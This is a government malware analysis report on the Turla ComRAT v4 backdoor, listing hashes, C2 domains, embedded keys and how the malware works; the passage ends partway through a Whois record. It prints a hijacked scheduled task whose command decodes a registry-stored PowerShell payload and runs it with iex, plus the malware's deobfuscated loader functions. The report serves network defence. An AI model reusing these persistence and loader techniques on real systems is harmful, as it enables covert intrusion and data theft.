{
  "markdown": "\n\n\n\n\n\n\nNotification\n\nThis report is provided \"as is\" for informational purposes only. The Department of Homeland Security (DHS) does not provide any warranties of any kind regarding any information contained herein. The DHS does not endorse any commercial product or service referenced in this bulletin or otherwise.\nThis document is marked TLP:WHITE--Disclosure is not limited. Sources may use TLP:WHITE when information carries minimal or no foreseeable risk of misuse, in accordance with applicable rules and procedures for public release. Subject to standard copyright rules, TLP:WHITE information may be distributed without restriction. For more information on the Traffic Light Protocol (TLP), see http://www.us-cert.gov/tlp.\n\nSummary\n\nDescription\nThis Malware Analysis Report (MAR) is the result of analytic efforts between the Cybersecurity and Infrastructure Security Agency (CISA), the Cyber National Mission Force (CNMF), and the Federal Bureau of Investigation (FBI). The malware variant, known as ComRAT, has been used by Turla, a Russian-sponsored Advanced Persistent Threat (APT) actor. CISA, CNMF, and FBI are distributing this MAR to enable network defense and reduced exposure to malicious activity. This MAR includes suggested response actions and recommended mitigation techniques.\n\n\t\t\tFBI has high-confidence that Russian-sponsored APT actor Turla, which is an espionage group active for at least a decade, is using ComRAT malware to exploit victim networks. The group is well known for its custom tools and targeted operations.\n\n\t\t\tThis report analyzes a PowerShell script that installs a PowerShell script, which will decode and load a 64-bit dynamic-link library (DLL) identified as ComRAT version 4. This new variant of ComRAT contains embedded 32-bit and 64-bit DLLs used as communication modules. The communication module (32-bit or 64-bit DLL) is injected into the victim system\u00eds default browser. The ComRATv4 file and the communication module communicate with each other using a named pipe. The named pipe is used to send Hypertext Transfer Protocol (HTTP) requests and receive HTTP responses to and from the communication module for backdoor commands. It is designed to use a Gmail web interface to receive commands and exfiltrate data. The ComRAT v4 file contains a Virtual File System (VFS) in File Allocation Table 16 (FAT16) format, which includes the configuration and logs files.\n\n\t\t\tUsers or administrators should flag activity associated with the malware and report the activity to the CISA or the FBI Cyber Watch (CyWatch), and give the activity the highest priority for enhanced mitigation. For more information on malicious cyber activity, please visit https://us-cert.cisa.gov/\nFor a downloadable copy of IOCs, see: MAR-10310246-2.v1.WHITE.stix.\nSubmitted Files (5)\n00352afc7e7863530e4d68be35ae8b60261fc57560167645697b7bfc0ac0e93d (Communication_module_32.dll)\n134919151466c9292bdcb7c24c32c841a5183d880072b0ad5e8b3a3a830afef8 (corrected.ps1)\n166b1fb3d34b32f1807c710aaa435d181aedbded1e7b4539ffa931c2b2cdd405 (Communication_module_64.dll)\n44d6d67b5328a4d73f72d8a0f9d39fe4bb6539609f90f169483936a8b3b88316 (ComRATv4.exe)\na3170c32c09fc85cdda778a5c20a3dab144b6d1dd9996ba8340866e0081c7642 (Decode_PowerShell.ps1)\nDomains (6)\nbranter.tk\nbronerg.tk\ncrusider.tk\nduke6.tk\nsanitar.ml\nwekanda.tk\n\nFindings\n\n134919151466c9292bdcb7c24c32c841a5183d880072b0ad5e8b3a3a830afef8\nTags\ndropper\nDetails\n\n\n\nName\ncorrected.ps1\n\n\nSize\n4345430 bytes\n\n\nType\nLittle-endian UTF-16 Unicode text, with very long lines, with CRLF, LF line terminators\n\n\nMD5\n65419948186842f8f3ef07cafb71f59a\n\n\nSHA1\n93537b0814177e2101663306aa17332b9303e08a\n\n\nSHA256\n134919151466c9292bdcb7c24c32c841a5183d880072b0ad5e8b3a3a830afef8\n\n\nSHA512\n83d093c6febacb11fcde57fee98c2385f628e5cd3629bfabd0f9e4d2c5de18c6336b3d3aff8081b06a827e742876d19ae370e81890c247daac73d4f8b7ea5f90\n\n\nssdeep\n24576:+vq2EYNg0gX792UHDoSe9Ov2a8p+JnHZUoWYWUpcfm3WuPhu/aqJOFKs4Wuw054o:Drr9q0v4ubJmg4OFuwkOM5NZihxs\n\n\nEntropy\n4.004402\n\n\n\nAntivirus\nNo matches found.\nYARA Rules\nNo matches found.\nssdeep Matches\nNo matches found.\nRelationships\n\n\n\n1349191514...\nContains\na3170c32c09fc85cdda778a5c20a3dab144b6d1dd9996ba8340866e0081c7642\n\n\n\nDescription\nThis file is a heavily encoded malicious PowerShell script. It is designed to install a malicious PowerShell script into a registry on the victim system. This malicious script also modifies the following scheduled task on the victim's system:\n\n\t\t\t\u2014Begin Modified Scheduled Task\u2014\n\t\t\tC:\\Windows\\System32\\Tasks\\Microsoft\\Windows\\Customer Experience Improvement Program\\Consolidator\n\t\t\t\u2014End Modified Scheduled Task\u2014\n\n\t\t\tThe modification of this scheduled task causes the installed malicious PowerShell script to be executed. Displayed below is the original scheduled task:\n\n\t\t\t\u2014Begin Original Scheduled Task\u2014\n\t\t\t<?xml version=\"1.0\" encoding=\"UTF-16\"?>\n\t\t\t<Task xmlns=\"http://schemas.microsoft.com/windows/2004/02/mit/task\">\n\t\t\t<RegistrationInfo>\n\t\t\t\u00a0\u00a0\u00a0<Version>1.0</Version>\n\t\t\t\u00a0\u00a0\u00a0<SecurityDescriptor>D:(A;OICI;FA;;;BA)(A;OICI;FA;;;SY)(A;OICI;GRGX;;;AU)</SecurityDescriptor>\n\t\t\t\u00a0\u00a0\u00a0<Source>$(@%systemRoot%\\system32\\wsqmcons.exe,-106)</Source>\n\t\t\t\u00a0\u00a0\u00a0<Author>$(@%systemRoot%\\system32\\wsqmcons.exe,-108)</Author>\n\t\t\t\u00a0\u00a0\u00a0<Description>$(@%systemRoot%\\system32\\wsqmcons.exe,-107)</Description>\n\t\t\t\u00a0\u00a0\u00a0<URI>\\Microsoft\\Windows\\Customer Experience Improvement Program\\Consolidator</URI>\n\t\t\t</RegistrationInfo>\n\t\t\t<Principals>\n\t\t\t\u00a0\u00a0\u00a0<Principal id=\"WinSQMAccount\">\n\t\t\t\u00a0\u00a0\u00a0 <UserId>S-1-5-18</UserId>\n\t\t\t\u00a0\u00a0\u00a0</Principal>\n\t\t\t</Principals>\n\t\t\t<Settings>\n\t\t\t\u00a0\u00a0\u00a0<DisallowStartIfOnBatteries>false</DisallowStartIfOnBatteries>\n\t\t\t\u00a0\u00a0\u00a0<StopIfGoingOnBatteries>false</StopIfGoingOnBatteries>\n\t\t\t\u00a0\u00a0\u00a0<MultipleInstancesPolicy>IgnoreNew</MultipleInstancesPolicy>\n\t\t\t\u00a0\u00a0\u00a0<StartWhenAvailable>true</StartWhenAvailable>\n\t\t\t\u00a0\u00a0\u00a0<IdleSettings>\n\t\t\t\u00a0\u00a0\u00a0 <StopOnIdleEnd>true</StopOnIdleEnd>\n\t\t\t\u00a0\u00a0\u00a0 <RestartOnIdle>false</RestartOnIdle>\n\t\t\t\u00a0\u00a0\u00a0</IdleSettings>\n\t\t\t\u00a0\u00a0\u00a0<UseUnifiedSchedulingEngine>true</UseUnifiedSchedulingEngine>\n\t\t\t</Settings>\n\t\t\t<Triggers>\n\t\t\t\u00a0\u00a0\u00a0<TimeTrigger>\n\t\t\t\u00a0\u00a0\u00a0 <StartBoundary>2004-01-02T00:00:00</StartBoundary>\n\t\t\t\u00a0\u00a0\u00a0 <Repetition>\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0<Interval>PT6H</Interval>\n\t\t\t\u00a0\u00a0\u00a0 </Repetition>\n\t\t\t\u00a0\u00a0\u00a0</TimeTrigger>\n\t\t\t</Triggers>\n\t\t\t<Actions Context=\"WinSQMAccount\">\n\t\t\t\u00a0\u00a0\u00a0<Exec>\n\t\t\t\u00a0\u00a0\u00a0 <Command>%SystemRoot%\\System32\\wsqmcons.exe</Command>\n\t\t\t\u00a0\u00a0\u00a0</Exec>\n\t\t\t</Actions>\n\t\t\t</Task>\n\t\t\t\u2014End Original Scheduled Task\u2014\n\n\t\t\tThe scheduled task is then modified by this malicious PowerShell script. Displayed below is the modified scheduled task:\n\n\t\t\t\u2014Begin Modified Scheduled Task\u2014\n\t\t\t<?xml version=\"1.0\" encoding=\"UTF-16\"?>\n\t\t\t<Task version=\"1.3\" xmlns=\"http://schemas.microsoft.com/windows/2004/02/mit/task\">\n\t\t\t<RegistrationInfo>\n\t\t\t\u00a0\u00a0\u00a0<Source>$(@%systemRoot%\\system32\\wsqmcons.exe,-106)</Source>\n\t\t\t\u00a0\u00a0\u00a0<Author>$(@%systemRoot%\\system32\\wsqmcons.exe,-108)</Author>\n\t\t\t\u00a0\u00a0\u00a0<Version>1.0</Version>\n\t\t\t\u00a0\u00a0\u00a0<Description>$(@%systemRoot%\\system32\\wsqmcons.exe,-107)</Description>\n\t\t\t\u00a0\u00a0\u00a0<URI>\\Microsoft\\Windows\\Customer Experience Improvement Program\\Consolidator</URI>\n\t\t\t\u00a0\u00a0\u00a0<SecurityDescriptor>D:(A;OICI;FA;;;BA)(A;OICI;FA;;;SY)(A;OICI;GRGX;;;AU)</SecurityDescriptor>\n\t\t\t</RegistrationInfo>\n\t\t\t<Triggers>\n\t\t\t\u00a0\u00a0\u00a0<TimeTrigger>\n\t\t\t\u00a0\u00a0\u00a0 <Repetition>\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0<Interval>PT6H</Interval>\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0<StopAtDurationEnd>false</StopAtDurationEnd>\n\t\t\t\u00a0\u00a0\u00a0 </Repetition>\n\t\t\t\u00a0\u00a0\u00a0 <StartBoundary>2004-01-02T00:00:00</StartBoundary>\n\t\t\t\u00a0\u00a0\u00a0 <Enabled>true</Enabled>\n\t\t\t\u00a0\u00a0\u00a0</TimeTrigger>\n\t\t\t\u00a0\u00a0\u00a0<LogonTrigger>\n\t\t\t\u00a0\u00a0\u00a0 <Enabled>true</Enabled>\n\t\t\t\u00a0\u00a0\u00a0</LogonTrigger>\n\t\t\t</Triggers>\n\t\t\t<Principals>\n\t\t\t\u00a0\u00a0\u00a0<Principal id=\"WinSQMAccount\">\n\t\t\t\u00a0\u00a0\u00a0 <RunLevel>LeastPrivilege</RunLevel>\n\t\t\t\u00a0\u00a0\u00a0 <UserId>SYSTEM</UserId>\n\t\t\t\u00a0\u00a0\u00a0</Principal>\n\t\t\t</Principals>\n\t\t\t<Settings>\n\t\t\t\u00a0\u00a0\u00a0<MultipleInstancesPolicy>IgnoreNew</MultipleInstancesPolicy>\n\t\t\t\u00a0\u00a0\u00a0<DisallowStartIfOnBatteries>false</DisallowStartIfOnBatteries>\n\t\t\t\u00a0\u00a0\u00a0<StopIfGoingOnBatteries>false</StopIfGoingOnBatteries>\n\t\t\t\u00a0\u00a0\u00a0<AllowHardTerminate>true</AllowHardTerminate>\n\t\t\t\u00a0\u00a0\u00a0<StartWhenAvailable>true</StartWhenAvailable>\n\t\t\t\u00a0\u00a0\u00a0<RunOnlyIfNetworkAvailable>false</RunOnlyIfNetworkAvailable>\n\t\t\t\u00a0\u00a0\u00a0<IdleSettings>\n\t\t\t\u00a0\u00a0\u00a0 <StopOnIdleEnd>true</StopOnIdleEnd>\n\t\t\t\u00a0\u00a0\u00a0 <RestartOnIdle>false</RestartOnIdle>\n\t\t\t\u00a0\u00a0\u00a0</IdleSettings>\n\t\t\t\u00a0\u00a0\u00a0<AllowStartOnDemand>true</AllowStartOnDemand>\n\t\t\t\u00a0\u00a0\u00a0<Enabled>true</Enabled>\n\t\t\t\u00a0\u00a0\u00a0<Hidden>false</Hidden>\n\t\t\t\u00a0\u00a0\u00a0<RunOnlyIfIdle>false</RunOnlyIfIdle>\n\t\t\t\u00a0\u00a0\u00a0<DisallowStartOnRemoteAppSession>false</DisallowStartOnRemoteAppSession>\n\t\t\t\u00a0\u00a0\u00a0<UseUnifiedSchedulingEngine>true</UseUnifiedSchedulingEngine>\n\t\t\t\u00a0\u00a0\u00a0<WakeToRun>false</WakeToRun>\n\t\t\t\u00a0\u00a0\u00a0<ExecutionTimeLimit>PT72H</ExecutionTimeLimit>\n\t\t\t\u00a0\u00a0\u00a0<Priority>7</Priority>\n\t\t\t</Settings>\n\t\t\t<Actions Context=\"WinSQMAccount\">\n\t\t\t\u00a0\u00a0\u00a0<Exec>\n\t\t\t\u00a0\u00a0\u00a0 <Command>cmd.exe</Command>\n\t\t\t\u00a0\u00a0\u00a0 <Arguments>/c \"%SystemRoot%\\System32\\wsqmcons.exe &amp; PowerShell.exe -v 2 \"$GS459ea = 'KVYYOBBA4331110uhyicnoor';\n\t\t\t[Text.Encoding]::ASCII.GetString([Convert]::\\\"Fr`omBa`se6`4Str`ing\\\"((gp HKLM:\\SOFTWARE\\Microsoft\\SQMClient\\Windows).WSqmCons))|iex;\n\t\t\t\"\"</Arguments>\n\t\t\t\u00a0\u00a0\u00a0</Exec>\n\t\t\t</Actions>\n\t\t\t</Task>\n\t\t\t\u2014End Modified Scheduled Task\u2014\n\n\t\t\t\u00a0\u00a0\u00a0The modification of the scheduled task illustrated below indicates the primary purpose of this task modification is to decode and execute a PowerShell script contained within the registry key HKLM:\\SOFTWARE\\Microsoft\\SQMClient\\Windows = WSqmCons:\n\n\t\t\t\u2014Begin Specific Scheduled Task Module\u2014\n\t\t\t<Actions Context=\"WinSQMAccount\">\n\t\t\t\u00a0\u00a0\u00a0<Exec>\n\t\t\t\u00a0\u00a0\u00a0 <Command>cmd.exe</Command>\n\t\t\t\u00a0\u00a0\u00a0 <Arguments>/c \"%SystemRoot%\\System32\\wsqmcons.exe &amp; PowerShell.exe -v 2 \"$GS459ea = 'KVYYOBBA4331110uhyicnoor';\n\t\t\t[Text.Encoding]::ASCII.GetString([Convert]::\\\"Fr`omBa`se6`4Str`ing\\\"((gp HKLM:\\SOFTWARE\\Microsoft\\SQMClient\\Windows).WSqmCons))|iex;\n\t\t\t\"\"</Arguments>\n\t\t\t\u2014End Specific Scheduled Task Module\u2014\n\n\t\t\tThis malicious script installs a PowerShell script (a3170c32c09fc85cdda778a5c20a3dab144b6d1dd9996ba8340866e0081c7642) into the \u201cWsqmCons\u201d registry key. The primary purpose of the newly installed PowerShell is to decode and load a malicious DLL, identified as ComRat v4 (44d6d67b5328a4d73f72d8a0f9d39fe4bb6539609f90f169483936a8b3b88316) onto the victim's system.\n\n\na3170c32c09fc85cdda778a5c20a3dab144b6d1dd9996ba8340866e0081c7642\nTags\ntrojan\nDetails\n\n\n\nName\nDecode_PowerShell.ps1\n\n\nSize\n1264496 bytes\n\n\nType\nASCII text, with very long lines, with CRLF, LF line terminators\n\n\nMD5\n0fd79f4c60593f6aae69ff22086c3bb0\n\n\nSHA1\n07f0692c856703d75a9946a0fbb3c0db03f7ac40\n\n\nSHA256\na3170c32c09fc85cdda778a5c20a3dab144b6d1dd9996ba8340866e0081c7642\n\n\nSHA512\n28a0ae0a779aa88499f70cf97ef9db9482527017ea76ee2e469e4184684c4d4fb0559e50f1721e7e9d02655bee4cdf7b12c62a3d037ea10130121cfbb772e250\n\n\nssdeep\n24576:jarQlVyeHtWdf7PyJjwLKWp57+7fb0TLaB7VrE:jD567vs1tm\n\n\nEntropy\n6.091278\n\n\n\nAntivirus\n\n\n\nAntiy\nGrayWare/PowerShell.Mimikatz.a\n\n\nClamAV\nWin.Trojan.PSempireInj-7013548-0\n\n\nMicrosoft Security Essentials\nTrojan:PowerShell/Powersploit.J\n\n\nNANOAV\nTrojan.Script.ExpKit.eydujq\n\n\nSymantec\nHacktool.Mimikatz\n\n\n\nYARA Rules\nNo matches found.\nssdeep Matches\nNo matches found.\nRelationships\n\n\n\na3170c32c0...\nContained_Within\n134919151466c9292bdcb7c24c32c841a5183d880072b0ad5e8b3a3a830afef8\n\n\na3170c32c0...\nDropped\n44d6d67b5328a4d73f72d8a0f9d39fe4bb6539609f90f169483936a8b3b88316\n\n\n\nDescription\nThis heavily encoded PowerShell script is installed by the malicious script \u201ccorrected.ps1\u201d (134919151466c9292bdcb7c24c32c841a5183d880072b0ad5e8b3a3a830afef8). It is designed to decode and load an embedded DLL which has been identified as a variant of the malware known as ComRat v4 \u201cComRATv4.exe (44d6d67b5328a4d73f72d8a0f9d39fe4bb6539609f90f169483936a8b3b88316).\n\n\t\t\tRemoval of some of the PowerShell obfuscation reveals the functions illustrated below. These functions are used to decompress the embedded DLL, before it is loaded on the target system:\n\n\t\t\t\u2014Begin PowerShell Helper Functions\u2014\n\t\t\t\u00a0\u00a0\u00a0using System;\n\t\t\t\u00a0\u00a0\u00a0using System.IO;\n\t\t\t\u00a0\u00a0\u00a0using System.IO.Compression;\n\n\t\t\t\u00a0\u00a0\u00a0public static class CD475bjf{\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0public static void DBQ800fc(Stream input, Stream output){byte[] buffer = new byte[16 * 1024];\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0int bytesRead;\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0while((bytesRead = input.Read(buffer, 0, buffer.Length)) > 0){\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0output.Write(buffer, 0, bytesRead);\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0}}}\n\t\t\t\u00a0\u00a0\u00a0\n\t\t\t\u00a0\u00a0\u00a0public static class MAE38aee{\n\t\t\t\u00a0\u00a0\u00a0\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0public static byte[] JZ653jdh(byte[] arrayToCompress){\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0using (MemoryStream outStream = new MemoryStream()){using (GZipStream tinyStream = new GZipStream(outStream, CompressionMode.Compress))using (MemoryStream mStream = new MemoryStream(arrayToCompress))CD475bjf.DBQ800fc(mStream, tinyStream);\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0return outStream.ToArray();\n\t\t\t\u00a0\u00a0\u00a0}}\n\t\t\t\u00a0\u00a0\u00a0\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0public static byte[] PGN255ij(byte[] arrayToDecompress){ \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0using (MemoryStream inStream = new MemoryStream(arrayToDecompress))using (GZipStream bigStream = new GZipStream(inStream, CompressionMode.Decompress))using (MemoryStream bigStreamOut = new MemoryStream()){CD475bjf.DBQ800fc(bigStream, bigStreamOut);\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0return bigStreamOut.ToArray();\n\t\t\t\u00a0\u00a0\u00a0}}}\n\n\t\t\t#decode base64 above\n\t\t\t$decompress = [Convert]::FromBase64String($decompressbase64);\n\n\t\t\t#create another text object for use later\n\t\t\t$NS70gea = New-Object System.Text.ASCIIEncoding;\n\n\t\t\t#convert base64 decoded value to string\n\t\t\t$decompress = $NS70gea.GetString($decompress,0,$decompress.Length);\n\t\t\t\u2014End PowerShell Helper Functions\u2014\n\n\t\t\tFigure 1 illustrates a part of the payload embedded within this malicious script. The encoded PowerShell script contains an embedded function named \u201cRun\u201d, that can load a DLL directly from memory and inject it into a remote process (Figure 2). The PowerShell script injects the embedded ComRAT DLL (44d6d67b5328a4d73f72d8a0f9d39fe4bb6539609f90f169483936a8b3b88316) into the Windows Explorer process.\nScreenshots\n \n\nFigure 1 - Screenshot of the payload embedded within this malicious script.\n\n \n\nFigure 2 - Screenshot of the function used to load a DLL directly from memory and inject it into a remote process.\n\n\n\n44d6d67b5328a4d73f72d8a0f9d39fe4bb6539609f90f169483936a8b3b88316\nTags\ntrojan\nDetails\n\n\n\nName\nComRATv4.exe\n\n\nSize\n1827840 bytes\n\n\nType\nPE32+ executable (DLL) (GUI) x86-64, for MS Windows\n\n\nMD5\nfaaafa3e115033ba5115ed6a6ba59ba9\n\n\nSHA1\nca16a95cd38707bad2dc524bb3086b3c0cb3e372\n\n\nSHA256\n44d6d67b5328a4d73f72d8a0f9d39fe4bb6539609f90f169483936a8b3b88316\n\n\nSHA512\n6f2fe02c1e15be2409f89ff1e6ae3c78f87e242ee448fe5ff6d375a74f10c7c6cc01f3f6d796aa34599a891e03c5d421d10f0c041e5a6dc0e346aea3ae21a935\n\n\nssdeep\n49152:jTRjrgdOU9p1PZH/JNTFTJT5dwIwzQJH:PRCBNTBwAH\n\n\nEntropy\n6.463931\n\n\n\nAntivirus\n\n\n\nAhnlab\nTrojan/Win64.Turla\n\n\nESET\na variant of Win64/Turla.BX trojan\n\n\n\nYARA Rules\nNo matches found.\nssdeep Matches\nNo matches found.\nPE Metadata\n\n\n\nCompile Date\n2018-03-06 09:38:38-05:00\n\n\nImport Hash\nd9d661a606c9d1c23b47672d1067de68\n\n\n\nPE Sections\n\n\n\nMD5\nName\nRaw Size\nEntropy\n\n\n11525199e6e248e88e0529cf72a9002d\nheader\n1024\n2.934959\n\n\n0f3258519a92690d14406e141dcb285b\n.text\n1027584\n6.441800\n\n\nfa4840dc4653443d4574486df39bc6a3\n.rdata\n481280\n4.896843\n\n\nca22c78d526550925d7843a24cd1d266\n.data\n264704\n7.368343\n\n\nf7cc8fa49cfa87a125d8354082e162f3\n.pdata\n47104\n6.030652\n\n\nef6fdd7440f36ba21373b4585a5c83e4\n.rsrc\n512\n4.724729\n\n\n4f16258cf938a4bc7fe0ae92121f442d\n.reloc\n5632\n5.425381\n\n\n\nRelationships\n\n\n\n44d6d67b53...\nContains\n00352afc7e7863530e4d68be35ae8b60261fc57560167645697b7bfc0ac0e93d\n\n\n44d6d67b53...\nContains\n166b1fb3d34b32f1807c710aaa435d181aedbded1e7b4539ffa931c2b2cdd405\n\n\n44d6d67b53...\nDropped_By\na3170c32c09fc85cdda778a5c20a3dab144b6d1dd9996ba8340866e0081c7642\n\n\n\nDescription\nThis application is a 32-bit Windows DLL that has been identified as a module of ComRAT v4. The DLL is loaded into Windows Explorer (Explorer.exe) by a ComRAT PowerShell loader (a3170c32c09fc85cdda778a5c20a3dab144b6d1dd9996ba8340866e0081c7642). When executed, it checks the victim's system day\\time and it performs code execution between 9AM to 5PM Monday through Friday. During execution, it installs the following files into the %TEMP% folder:\n\n\t\t\t--Begin files--\n\t\t\t\"%TEMP%\\iecache.bin\" ==> an AES-256-XTS encrypted VFS FAT16 format, containing the malware configuration and the logs files. (The encryption key is generated during runtime and stored in the Windows registry).\n\t\t\t\"%TEMP%\\FSAPIDebugLogFile.txt\n\t\t\t--End files--\n\n\t\t\tThe malware injects an embedded communication module (00352afc7e7863530e4d68be35ae8b60261fc57560167645697b7bfc0ac0e93d or (166b1fb3d34b32f1807c710aaa435d181aedbded1e7b4539ffa931c2b2cdd405) into the victim system's default browser and executes it. This file and the communication module communicate with each other using a named pipe. The malware uses the named pipe to send HTTP requests and receive HTTP responses to and from the communication module for backdoor commands. It is designed to use the Gmail web interface to receive commands and exfiltrate data.\n\n\t\t\tIllustrated below are sample data observed in the decrypted VFS in FAT16 format. Some of these files can be updated in the VFS using backdoor commands.\n\n\t\t\t--Begin sample data in the VFS --\n\t\t\t\"/etc/pal/\" contains a list of C2 domains: \"bronerg.tk|crusider.tk|duke6.tk\"\n\t\t\t\"/etc/gal.bin\" contains a list of C2 domains: \"sanitar.ml|wekanda.tk|branter.tk\"\n\t\t\t\"/etc/pki/aes_key.pki\" : Contains the Advanced Encryption Standard (AES) encryption keys for the C2 communications:\n\n\t\t\t--Begin AES key--\n\t\t\t4F8112E9E5AB5391C584D567B58E539F0400094A83EA0C2DDC7FA455FCF447B1\n\t\t\t--End AES key--\n\n\t\t\t\"/etc/pki/public_cert.pki\" contains the Rivest\u2013Shamir\u2013Adleman (RSA) encryption key used for the C2 communications:\n\n\t\t\t--Begin RSA key--\n\t\t\tBE51E00093CEB0A5FCAE59EB4EEEB3079D1CB17FC195321587CB513003826917B0BC13EB3B9A4209A4FFAF19C07249D360F447A6FAE3936612516A152619B800C4BE12FFF7077D7AF959ABBFD0A1BC06CD3B9D8DBC079307D79B78E4C7F114DE3B530DF40E40C14299D47CD6530A765B1F2717EAA66AD139B3F6728AFFFC5B6AB3E2B36FB062AD167E2B4450A295038A211E0A8E8BFE01FE338ACF883518099663E95B6266AB037224A32853002A47248012567455AC75939FDFC4018D86C2A6D72770887A8FE0678F5E7BC527FB4787D70923FC6909ACF8DC651F93B5E537ABF860B3262723FB2181E9132E381D892A8864BAB38687231B1E47C00BF10BC445010001\n\t\t\t--End RSA key--\n\n\t\t\tIt uses the public key cryptography with RSA and AES encrypted email attachments for its Gmail C2 channel.\n\t\t\t\"/etc/mail/subj_dict\" contains the the Subject \"Re: |RE: |FW: |FWD: | Fw: | Fwd:| FYI: |FYIP |NRN: | NT: | N/T | n/t| NB |NM| n/m |N/M: |*n/m*\"\n\n\t\t\t\"/etc/php_storage/GET/DEF/server.txt \" and \"/etc/php_storage/POST/DEF/server.txt\" contains server IP \"172.22.150.125\".\n\t\t\t--End sample data in the VFS --\nScreenshots\n \n\nFigure 3 - The first bytes of the decrypted VFS in FAT16 format.\n\n \n\nFigure 4 - The decrypted VFS hierarchy, containing the malware configuration and the logs files.\n\n\n\n00352afc7e7863530e4d68be35ae8b60261fc57560167645697b7bfc0ac0e93d\nTags\nbackdoordownloaderloadertrojan\nDetails\n\n\n\nName\nCommunication_module_32.dll\n\n\nSize\n61440 bytes\n\n\nType\nPE32 executable (DLL) (GUI) Intel 80386, for MS Windows\n\n\nMD5\ne509c3a40045d2dab9404240f3f201ed\n\n\nSHA1\n86f747cac3b16ed2dab6d9f72a347145ff7a850d\n\n\nSHA256\n00352afc7e7863530e4d68be35ae8b60261fc57560167645697b7bfc0ac0e93d\n\n\nSHA512\nf78827b6fc258f4a63dd17fec2acb7114329a9d7fd426c72838f2e5e5c54c12fce7be7a0eb9c7e7e74b01fe80c42293ef89c3bcbafd230a68f9639e57f62bb6f\n\n\nssdeep\n1536:zlAjaBOUFoD0C8YQ7aZS7C2kkAxWzg39xa3cdjrH++:zl2uOUG0CBQ7aZS7C3uzg39xEM\n\n\nEntropy\n5.338807\n\n\n\nAntivirus\n\n\n\nAntiy\nTrojan[Backdoor]/Win32.Turla\n\n\nAvira\nTR/Crypt.XPACK.Gen3\n\n\nESET\na variant of Win32/Turla.EO trojan\n\n\nIkarus\nTrojan-Downloader.Win32.Farfli\n\n\nNANOAV\nTrojan.Win32.Turla.hlrzcr\n\n\nSymantec\nHeur.AdvML.B\n\n\n\nYARA Rules\nNo matches found.\nssdeep Matches\nNo matches found.\nPE Metadata\n\n\n\nCompile Date\n2018-03-06 09:36:54-05:00\n\n\nImport Hash\n87ab41c57e95562a3e81f0609398b278\n\n\n\nPE Sections\n\n\n\nMD5\nName\nRaw Size\nEntropy\n\n\nb9bd1636e8c11ff1ab2368771e89cfac\nheader\n4096\n0.612975\n\n\n077bf2412ba289da7b6261ffec65988d\n.text\n49152\n6.051754\n\n\n1c95870051ff12b740487ff93d19ef3b\n.rdata\n4096\n0.317233\n\n\nb86e403ac8c58a013fe4cda6b6715804\n.reloc\n4096\n0.019202\n\n\n\nRelationships\n\n\n\n00352afc7e...\nContained_Within\n44d6d67b5328a4d73f72d8a0f9d39fe4bb6539609f90f169483936a8b3b88316\n\n\n00352afc7e...\nConnected_To\nbranter.tk\n\n\n00352afc7e...\nConnected_To\nwekanda.tk\n\n\n00352afc7e...\nConnected_To\nsanitar.ml\n\n\n00352afc7e...\nConnected_To\nduke6.tk\n\n\n00352afc7e...\nConnected_To\nbronerg.tk\n\n\n00352afc7e...\nConnected_To\ncrusider.tk\n\n\n\nDescription\nThis application is a 32-bit Windows DLL that has been identified as the communication module injected into the victim's system default browser by \"ComRATv4.exe\" (44d6d67b5328a4d73f72d8a0f9d39fe4bb6539609f90f169483936a8b3b88316). It is designed to use the HTTP and a Gmail web interface for the C2. It attempts to connect to its C2 using secure connections.\n\n\t\t\t--Begin list of domains--\n\t\t\tbronerg.tk\n\t\t\tcrusider.tk\n\t\t\tduke6.tk\n\t\t\tsanitar.ml\n\t\t\twekanda.tk\n\t\t\tbranter.tk\n\t\t\t--End list of domains--\n\n\t\t\tDisplayed below is sample request header:\n\n\t\t\t--Begin header--\n\t\t\tCONNECT bronerg[.]tk:443 HTTP/1.0\n\t\t\tUser-Agent: Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.1; Win64; x64; Trident/7.0; .NET CLR 2.0.50727; SLCC2; .NET CLR 3.5.30729; .NET CLR 3.0.30729; Media Center PC 6.0; .NET4.0C; .NET4.0E; InfoPath.3)\n\t\t\tHost: bronerg.tk:443\n\t\t\tContent-Length: 0\n\t\t\tConnection: Keep-Alive\n\t\t\t--End header--\n\n\nbronerg.tk\nTags\ncommand-and-control\nWhois\nDomain name:\n\t\t\t\u00a0\u00a0\u00a0 BRONERG.TK\n\n\t\t\tOrganisation:\n\t\t\t\u00a0\u00a0\u00a0 Freedom Registry, Inc.\n\t\t\t\u00a0\u00a0\u00a0 2225 East Bayshore Road #290\n\t\t\t\u00a0\u00a0\u00a0 Palo Alto CA 94303\n\t\t\t\u00a0\u00a0\u00a0 United States\n\t\t\t\u00a0\u00a0\u00a0 Phone: +1 650-681-4172\n\t\t\t\u00a0\u00a0\u00a0 Fax: +1 650-681-4173\n\n\t\t\tDomain Nameservers:\n\t\t\t\u00a0\u00a0\u00a0 NS01.FREENOM.COM\n\t\t\t\u00a0\u00a0\u00a0 NS02.FREENOM.COM\n\t\t\t\u00a0\u00a0\u00a0 NS03.FREENOM.COM\n\t\t\t\u00a0\u00a0\u00a0 NS04.FREENOM.COM\nRelationships\n\n\n\nbronerg.tk\nConnected_From\n166b1fb3d34b32f1807c710aaa435d181aedbded1e7b4539ffa931c2b2cdd405\n\n\nbronerg.tk\nConnected_From\n00352afc7e7863530e4d68be35ae8b60261fc57560167645697b7bfc0ac0e93d\n\n\n\nDescription\nComRAT v4 C2 domain.\n\n\ncrusider.tk\nTags\ncommand-and-control\nPorts\n\n443 TCP\n\nWhois\nDomain 